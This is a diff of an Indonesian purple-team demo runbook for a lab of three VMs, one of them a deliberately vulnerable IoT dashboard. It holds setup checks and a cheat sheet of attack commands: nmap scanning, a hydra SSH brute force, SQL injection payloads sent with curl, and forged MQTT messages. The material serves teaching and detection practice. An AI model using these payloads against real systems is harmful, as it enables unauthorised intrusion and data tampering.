@@ -1,8 +1,116 @@
 # Runbook Demo Purple Team
 
-Dokumen ini dipakai saat demo, bukan saat persiapan. Untuk persiapan, selesaikan dulu `bersih-bersih-sebelum-demo.md`.
+Dokumen ini dipakai dari persiapan sampai demo selesai. Untuk membersihkan sisa rekaman sebelumnya, lihat juga `bersih-bersih-sebelum-demo.md`.
 
 Ditulis ulang 26 November 2026 setelah pengecekan langsung ke VM.
+
+---
+
+# Bagian 0 - Persiapan, 30 menit sebelum demo
+
+Kerjakan ini sebelum penonton datang. Kalau semuanya sudah hijau, buka Bagian 4 dan demo langsung.
+
+## 0.1 Nyalakan tiga VM, urutannya penting
+
+Di host, Target dulu, Onion terakhir karena paling lama siap.
+
+`"/c/Program Files/Oracle/VirtualBox/VBoxManage.exe" startvm "AYAM" --type headless`
+
+`"/c/Program Files/Oracle/VirtualBox/VBoxManage.exe" startvm "Cybersecurity LabVM Worksation 20230210" --type headless`
+
+`"/c/Program Files/Oracle/VirtualBox/VBoxManage.exe" startvm "CyberOps Security Onion" --type headless`
+
+`"/c/Program Files/Oracle/VirtualBox/VBoxManage.exe" list runningvms`
+
+Kalau salah satu gagal dengan `VERR_NO_PAGE_MEMORY`, host kehabisan memori. Tutup Spotify dan Chrome dulu, atau kecilkan RAM VM Attacker.
+
+## 0.2 Target, cek alamat dan layanan
+
+Di VM AYAM:
+
+`ip -4 a | grep 192.168.5`
+
+Harus `192.168.5.5/24`. Kalau kosong, `sudo netplan apply`, cek lagi.
+
+`ss -tln | grep -e ':3000' -e ':1883' -e ':3306'`
+
+Harus muncul 3000 di `0.0.0.0`, 1883 di `0.0.0.0`, dan 3306 di `127.0.0.1`.
+
+## 0.3 Target, cek aplikasi dan subscriber hidup
+
+`ps aux | grep -e app.py -e subscriber | grep -v grep`
+
+Harus ada `python3 app.py` dan `python3 subscriber.py`, masing-masing satu.
+
+Kalau mati:
+
+`cd /opt/iot-dashboard`
+
+`sudo -b nohup python3 app.py > /tmp/dashboard.log 2>&1 &`
+
+`sudo -b nohup python3 subscriber.py > /tmp/subscriber.log 2>&1 &`
+
+Cek log subscriber, harus ada `menunggu pesan di sensors/#`:
+
+`tail -5 /tmp/subscriber.log`
+
+## 0.4 Target, pastikan versi berkas benar
+
+`ls -l /opt/iot-dashboard/app.py /opt/iot-dashboard/app.py.aman`
+
+`app.py` harus 806 byte, versi rentan. `app.py.aman` harus 1155 byte, versi aman.
+
+Kalau `app.py.aman` juga 806 byte, versi amannya hilang dan sesi mitigasi tidak punya tujuan. Ambil ulang dari repo, berkasnya ada di `docs/final/lampiran-kode/app.py.aman`, lalu pasang dengan `sudo cp`.
+
+## 0.5 Target, pastikan MQTT terbuka
+
+`cat /etc/mosquitto/conf.d/default.conf`
+
+Harus memuat `listener 1883 0.0.0.0` dan `allow_anonymous true`.
+
+## 0.6 Target, kosongkan ban dan data palsu
+
+`sudo fail2ban-client status sshd`
+
+Daftar banned harus kosong. Kalau ada `192.168.5.100`:
+
+`sudo fail2ban-client unban 192.168.5.100`
+
+Data palsu dari rekaman sebelumnya, kalau masih ada:
+
+`sudo mysql -u root -p` lalu `USE iot_db;` lalu `DELETE FROM sensor_readings WHERE device_id='sensor-99';` lalu `exit`
+
+## 0.7 Attacker, cek alat
+
+Di VM Attacker:
+
+`which nmap hydra curl mosquitto_pub mosquitto_sub`
+
+Semua harus keluar path-nya. Kalau salah satu tidak ada, pasang sebelum demo, jangan saat demo.
+
+Tes sekali koneksi ke target:
+
+`curl -s -m 5 "http://192.168.5.5:3000/sensor?device=sensor-01"`
+
+Harus keluar dua baris.
+
+## 0.8 Onion, nyalakan Kibana
+
+Detailnya di Bagian 4b. Ringkasnya: `sudo so-status`, nyalakan Elasticsearch lalu Kibana, tunggu, buka `https://localhost` di browser dalam VM Onion.
+
+## 0.9 Tabel go atau no-go
+
+| Cek | Harus | Kalau gagal |
+| --- | --- | --- |
+| Tiga VM nyala | ya | nyalakan, tutup aplikasi host kalau memori kurang |
+| IP `192.168.5.5` | ada | `sudo netplan apply` |
+| Dashboard 3000 | nyala | jalankan ulang dengan `nohup` |
+| Subscriber | satu proses | `killall -f subscriber` lalu jalankan satu |
+| Payload OR | 4 baris | `app.py` bukan versi rentan, tukar |
+| MQTT terbuka | ya | perbaiki `default.conf` |
+| Kibana | kebuka | lanjut tanpa Kibana, jangan buang waktu |
+
+Kalau semua hijau, demo siap. Kalau ada yang merah dan tidak bisa dibereskan dalam 10 menit, tetap demo dan sebutkan apa adanya.
 
 ---
 
@@ -388,3 +496,66 @@ Harus muncul `menunggu pesan di sensors/#`.
 6. Menghapus data butuh akun root. `app_iot` tidak punya hak DELETE dan akan menghasilkan `ERROR 1142`.
 7. Kibana memakai UTC, catatan tim memakai WIB, selisih tujuh jam. Jangan mengira itu sesi berbeda.
 8. Menuliskan perintah dengan tanda kutip lewat chat berisiko terpotong saat disalin. Ketik SQL langsung di prompt mysql.
+
+---
+
+# Bagian 7 - Contekan satu halaman
+
+Semua perintah yang dipakai demo, dikelompokkan per mesin. Buka bagian ini kalau lupa urutannya.
+
+## Di VM Target, AYAM
+
+| Keperluan | Perintah |
+| --- | --- |
+| cek alamat | `ip -4 a \| grep 192.168.5` |
+| pasang alamat | `sudo netplan apply` |
+| cek port | `ss -tln \| grep -e ':3000' -e ':1883'` |
+| cek proses | `ps aux \| grep -e app.py -e subscriber \| grep -v grep` |
+| nyalakan dashboard | `sudo -b nohup python3 app.py > /tmp/dashboard.log 2>&1 &` |
+| nyalakan subscriber | `sudo -b nohup python3 subscriber.py > /tmp/subscriber.log 2>&1 &` |
+| matikan dashboard | `killall -f app.py` |
+| cek versi berkas | `ls -l /opt/iot-dashboard/app.py /opt/iot-dashboard/app.py.aman` |
+| tukar ke aman | `sudo cp app.py.aman app.py` |
+| cek MQTT | `cat /etc/mosquitto/conf.d/default.conf` |
+| cek ban | `sudo fail2ban-client status sshd` |
+| unban | `sudo fail2ban-client unban 192.168.5.100` |
+| hapus data palsu | `sudo mysql -u root -p` lalu `USE iot_db;` lalu `DELETE FROM sensor_readings WHERE device_id='sensor-99';` |
+
+## Di VM Attacker
+
+| Keperluan | Perintah |
+| --- | --- |
+| skenario 1 | `nmap -sS -sV -p- 192.168.5.5` |
+| tes MySQL | `nc -vz 192.168.5.5 3306` |
+| tes SSH | `hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.5.5 -t 4` |
+| query normal | `curl "http://192.168.5.5:3000/sensor?device=sensor-01"` |
+| payload OR | `curl "http://192.168.5.5:3000/sensor?device=x%27%20OR%20%271%27%3D%271"` |
+| payload AND | `curl "http://192.168.5.5:3000/sensor?device=x%27%20AND%20%271%27%3D%272"` |
+| pantau MQTT | `mosquitto_sub -h 192.168.5.5 -t 'sensors/#' -v` |
+| kirim data palsu | `mosquitto_pub -h 192.168.5.5 -t sensors/sensor-99 -m "99.90,0.00"` |
+| buka dashboard | browser ke `http://192.168.5.5:3000` |
+
+## Di VM Onion
+
+| Keperluan | Perintah |
+| --- | --- |
+| cek layanan | `sudo so-status` |
+| nyalakan elastic | `sudo so-elasticsearch-start` |
+| nyalakan kibana | `sudo so-kibana-start` |
+| fallback docker | `sudo docker ps -a \| grep -e kibana -e elastic` |
+| buka kibana | browser dalam VM ke `https://localhost` |
+
+## Hasil yang harus keluar
+
+| Perintah | Hasil benar |
+| --- | --- |
+| query normal | 2 baris `sensor-01` |
+| payload OR | 4 baris, seluruh tabel |
+| payload AND | `()`, nol baris |
+| `nc` ke 3306 | timeout, bukan refused |
+| `hydra` | ditolak pada negosiasi metode |
+| `mosquitto_sub` sendirian | `Timed out`, bukan `not authorised` |
+| setelah mitigasi, payload OR | JSON `"jumlah": 0` |
+
+Kalau salah satu hasilnya tidak sesuai, jangan improvisasi di depan penonton. Sebut apa adanya, lalu lanjut ke bagian berikutnya.
+
